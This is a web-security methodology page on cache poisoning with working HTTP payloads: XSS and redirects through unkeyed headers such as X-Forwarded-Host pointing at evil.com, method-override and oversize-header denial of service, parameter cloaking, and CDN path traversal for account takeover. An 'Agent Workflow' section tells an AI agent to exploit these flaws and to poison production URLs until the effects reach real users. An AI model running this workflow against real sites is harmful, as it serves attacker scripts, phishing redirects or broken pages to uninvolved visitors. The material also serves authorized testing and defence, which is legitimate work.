# Cache Poisoning

> **Summary**: Manipulating unkeyed inputs (headers, params, cookies) to inject malicious content into cached responses served to other users.
> **Impact**: Stored XSS on all visitors, mass phishing via redirect poisoning, denial of service, account takeover via API key theft.
> **Typical Severity**: High | Critical

**Note**: Cache poisoning stores attacker-controlled content in the cache. For attacks that trick the cache into storing a victim's sensitive data, see [Cache Deception](cache-deception.md).

## Detection

### Indicators

- Response headers indicating caching: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <seconds>`, `Cache-Control: public, max-age=<N>`
- `Vary` header revealing which request headers are part of the cache key
- Reflected content from unkeyed headers (e.g., `X-Forwarded-Host`, `X-Forwarded-Scheme`)
- Behavior differences between authenticated and anonymous requests (different cache keys)

### Automated Detection

```bash
# Web Cache Vulnerability Scanner
wcvs -u https://<TARGET>/ -gr

# Param Miner (Burp Extension) - brute-forces unkeyed headers and params
# Install via BApp Store, right-click request -> "Guess headers" / "Guess params"
```

### Manual Detection

1. **Confirm caching**: Send a request, check for `X-Cache: miss`, resend and look for `X-Cache: hit`
2. **Use a cache buster**: Append a unique query param (e.g., `?cb=<RANDOM>`) to isolate your tests
3. **Fuzz unkeyed inputs**: Add headers like `X-Forwarded-Host: evil.com` and check if the value is reflected
4. **Test error code caching**: Send a request with an intentionally bad header to trigger a 400; re-request normally -- if 400 is returned, the error response was cached
5. **Compare cache keys**: Check if authenticated vs anonymous traffic uses different keys; fuzz rarely-keyed headers like `Content-Type`

## Exploitation

### Prerequisites

- A caching layer (CDN, reverse proxy, application cache) in front of the origin
- At least one unkeyed input that influences the response content
- Ability to trigger cache storage of the poisoned response

### Step-by-Step

1. **Identify unkeyed inputs** -- Use Param Miner to brute-force headers and parameters that change the response but are not part of the cache key
   - Success: Response content changes when injecting a header, but the cached version still serves the poisoned content
2. **Craft the malicious response** -- Inject a payload via the unkeyed input (XSS, redirect, DoS content)
3. **Ensure the response is cached** -- Repeat the poisoned request until `X-Cache: hit` confirms storage
4. **Verify cross-user impact** -- Access the same URL from a different session/browser without the injection header; confirm the poisoned response is served
5. **Targeted poisoning (optional)** -- If the `Vary` header includes `User-Agent`, match the victim's UA to poison their specific cache variant

### Payloads (organized by technique)

#### Unkeyed Header Injection (XSS via X-Forwarded-Host)

```http
GET /en?region=uk HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>
```

#### Scheme Poisoning (Redirect Loop via X-Forwarded-Scheme)

```http
GET /static/logo.png HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
```

Causes a cached 301 redirect loop, denying access to the static asset for all users.

#### Method Override DoS (X-HTTP-Method-Override)

```http
GET /static/app.js HTTP/1.1
Host: target.com
X-HTTP-Method-Override: HEAD
```

Returns empty body with `Content-Length: 0`, cached for all GET requests -- effectively removing the JS bundle.

#### Multiple Unkeyed Headers (Redirect + Scheme)

```http
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
```

#### Host Header Case Normalization

```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```

Some CDNs normalize to lowercase for cache keys but forward raw casing to origin, causing different behavior.

### Fat GET

GET request with a body. Cache keys the URL param, but the server processes the body param:

```http
GET /contact/report-abuse?report=innocent HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=attacker-value
```

### Parameter Cloaking

Discrepancy in parameter parsing between cache and origin (e.g., `;` vs `&` as separator):

```http
GET /?language=en&a=b;language=de HTTP/1.1
Host: target.com
```

Cache keys `language=en`, origin processes `language=de`.

### Cache Poisoning to DoS

| Technique | Description |
|-----------|-------------|
| HTTP Header Oversize (HHO) | Send a header larger than origin allows but within cache limit; 400 gets cached |
| HTTP Meta Character (HMC) | Inject `\n`, `\r` in headers; origin errors, cache stores the error |
| Unkeyed Port | `Host: target.com:1` -- redirect to non-existent port gets cached |
| Long Redirect | `GET /login?x=<VERY_LONG_STRING>` -- 414 error gets cached for `/login/` |
| Fat GET body | Some servers reject GET with body (403); that rejection gets cached |

### CDN-Specific Techniques

| CDN | Behavior |
|-----|----------|
| **Cloudflare** | Caches based on file extension (`.js`, `.css`, `.png`, etc.); case-normalizes `Host` for cache keys |
| **Akamai** | Often includes custom headers in cache keys; test with `Pragma: akamai-x-cache-on` |
| **Fastly/Varnish** | May cache specific GET params (e.g., `size`); URL-encoded param variants may bypass keying |

### Next.js Specific

```http
GET /<PAGE_PATH> HTTP/1.1
Host: target.com
x-middleware-prefetch: 1
```

Poisons a page with empty JSON data (CVE-2023-46298). Also try `Rsc: 1`.

### Proof of Concept

1. Add cache buster: `GET /page?cb=test123`
2. Inject: `X-Forwarded-Host: <ATTACKER_DOMAIN>`
3. Repeat until `X-Cache: hit`
4. Open the URL in incognito without the header -- confirm injected content appears

## Bypasses

- If `Vary: User-Agent` limits poisoning scope, exfiltrate the victim's UA first (e.g., via analytics) and match it
- If cache keys include some headers, look for **other** unkeyed headers (e.g., `X-Original-URL`, `X-Rewrite-URL`)
- Use URL discrepancies: delimiters (`;`, `%00`, `%0a`) or dot-segments (`/../`) that the cache and origin parse differently
- Path traversal through CDN: `GET /share/%2F..%2Fapi/auth/session` -- CDN caches under `/share/*`, origin resolves `/api/auth/session`
- Probe for exposed cache maintenance verbs: `PURGE`, `BAN` to flush and re-poison on demand

## Escalation

- **Cache Poisoning -> Stored XSS**: Inject `<script>` via unkeyed header reflection
- **Cache Poisoning -> ATO**: Steal API keys via path traversal through CDN (e.g., OpenAI ChatGPT ATO)
- **Cache Poisoning -> Mass DoS**: Poison critical JS/CSS assets with empty or error responses
- **Via [Request Smuggling](request-smuggling.md)**: Smuggle a request that poisons the cache for a high-value static resource
- **Via [CORS](cors.md) misconfiguration**: Poison `Access-Control-Allow-Origin` to enable cross-origin data theft

## Cacheable Extensions

```
js, css, png, jpg, jpeg, gif, ico, svg, woff, woff2, ttf, eot,
pdf, mp3, mp4, avi, webm, webp, json, xml, zip, gz, tar, 7z
```

## Tools

| Tool | Usage |
|------|-------|
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension to brute-force unkeyed headers/params |
| [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) | `wcvs -u <URL>` -- automated cache poisoning detection |
| [toxicache](https://github.com/xhzeem/toxicache) | Golang scanner for cache poisoning across URL lists |
| [CacheDecepHound](https://github.com/g4nkd/CacheDecepHound) | Python scanner for cache deception vulnerabilities |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. Send a request to `<TARGET>` and check response headers for caching indicators:
   ```bash
   curl -s -I "https://<TARGET>/<PAGE>" | grep -iE "(x-cache|cf-cache-status|age:|cache-control|vary)"
   ```
2. Confirm caching behavior: send a request, note `X-Cache: MISS`, resend the same request and look for `X-Cache: HIT`
3. Add a cache buster to isolate tests: append `?cb=<RANDOM>` to each URL
4. Use Param Miner (Burp extension) to brute-force unkeyed headers: right-click request -> "Guess headers"
5. Use Param Miner to brute-force unkeyed query parameters: right-click request -> "Guess params"
6. Manually test common unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`

### Phase 2: Validation
1. For each unkeyed input found, inject a canary value and check if it is reflected in the response:
   ```
   X-Forwarded-Host: <CANARY_VALUE>
   ```
2. Send the poisoned request repeatedly until `X-Cache: HIT` confirms the response is cached
3. Open the same URL in an incognito browser (without the injected header) and verify the cached response contains the canary value
4. Check the `Vary` header to understand which request headers are part of the cache key (e.g., `Vary: User-Agent` limits poisoning to matching UAs)
5. Test fat GET: send a GET request with a body parameter that overrides a URL parameter -- check if the cache keys the URL param but the server processes the body param
6. Test error-code caching: send a request with an oversized header to trigger a 400 error, then check if the error response is cached for normal requests

### Phase 3: Exploitation
1. **XSS via unkeyed header**: Inject JavaScript payload via reflected unkeyed header:
   ```http
   GET /<PAGE>?cb=<CACHE_BUSTER> HTTP/1.1
   Host: <TARGET>
   X-Forwarded-Host: "><script>alert(document.domain)</script>
   ```
2. Repeat the request until `X-Cache: HIT`, then verify the XSS fires in incognito
3. **Redirect poisoning**: Inject `X-Forwarded-Host: <ATTACKER>` to redirect users to an attacker-controlled domain
4. **DoS via method override**: Send `X-HTTP-Method-Override: HEAD` on a GET request to cache an empty response for a critical JS/CSS file
5. **Targeted poisoning**: If `Vary: User-Agent` is set, match the victim's exact UA string to poison their specific cache variant
6. Remove the cache buster and poison the production URL for real-world impact demonstration

### Phase 4: Escalation
1. Chain with [XSS](xss.md): cached XSS via unkeyed header becomes stored XSS affecting all visitors
2. Chain with [Request Smuggling](request-smuggling.md): smuggle a request that poisons a high-traffic static resource
3. **Account takeover**: use CDN path traversal to poison API authentication endpoints (e.g., ChatGPT ATO technique)
4. **Mass DoS**: poison critical JavaScript or CSS bundles with empty responses to break the application for all users
5. Chain with [CORS](cors.md): poison `Access-Control-Allow-Origin` header to enable cross-origin data theft

## Decision Tree

```
Confirm caching exists (X-Cache, CF-Cache-Status, Age headers)
├── Run Param Miner to find unkeyed inputs
│   ├── Unkeyed header found (X-Forwarded-Host, X-Forwarded-Scheme, etc.)
│   │   ├── Header value reflected in response body? → XSS via cache poisoning
│   │   ├── Header value reflected in Location header? → Redirect poisoning
│   │   └── Header causes error response? → DoS via cached error
│   ├── Unkeyed query parameter found
│   │   └── Parameter value reflected? → XSS via unkeyed param
│   ├── Fat GET body overrides URL param?
│   │   └── Cache keys URL param, server uses body param → Parameter cloaking
│   └── No unkeyed inputs found
│       ├── Test HTTP method override (X-HTTP-Method-Override: HEAD) → DoS
│       ├── Test header oversize (HHO) → Cached 400 error → DoS
│       └── Test meta characters in headers (HMC) → Cached error → DoS
└── No caching detected → Not vulnerable to cache poisoning
```

## Success Criteria
- A cached response at `<TARGET>/<PAGE>` contains attacker-controlled content (XSS payload, redirect, or error) that is served to other users who did not send the poisoned header
- The poisoned response persists in the cache (confirmed by accessing the URL from a different session/browser without injecting any headers)
- Impact affects real users: XSS executes, redirect fires, or critical resources are broken

---

## References

- [PortSwigger - Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research - Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [PortSwigger Research - Gotta Cache Em All](https://portswigger.net/research/gotta-cache-em-all)
- [PayloadsAllTheThings - Web Cache Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Poisoning)
- [0xAwali - Beyond Web Caching Vulnerabilities](https://medium.com/@0xAwali/beyond-web-caching-vulnerabilities-c617d8cdbb85)
- [Cache Poisoning Case Studies](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)
- [ChatGPT ATO via Cache Poisoning](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)

**See also**: [Cache Deception](cache-deception.md) | [Request Smuggling](request-smuggling.md) | [CORS](cors.md)
